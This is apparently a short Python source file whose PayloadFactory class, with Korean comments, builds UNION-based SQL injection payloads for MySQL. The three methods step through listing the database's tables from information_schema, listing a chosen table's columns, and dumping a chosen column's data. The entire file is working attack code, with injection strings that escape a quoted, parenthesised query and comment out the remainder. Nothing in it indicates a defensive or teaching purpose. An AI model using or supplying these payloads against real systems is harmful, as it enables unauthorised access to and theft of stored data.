
class PayloadFactory:

    #테이블 스캔
    def table_enumeration():

        return (
            "' ) UNION SELECT DISTINCT "
            "ROW_NUMBER() OVER(), table_name, null, null, null "
            "FROM information_schema.tables "
            "WHERE table_schema = DATABASE() #"
        )

    #컬럼 스캔
    def column_enumeration(table_name):

        return (
            "' ) UNION SELECT DISTINCT "
            "ROW_NUMBER() OVER(), column_name, null, null, null "
            "FROM information_schema.columns "
            "WHERE table_schema = DATABASE() "
            f"AND table_name = '{table_name}' #"
        )

    #데이터 스캔
    def data_enumeration(table_name, column_name):

        return (
            "' ) UNION SELECT DISTINCT "
            "ROW_NUMBER() OVER(), "
            f"{column_name}, null, null, null "
            f"FROM {table_name} #"
        )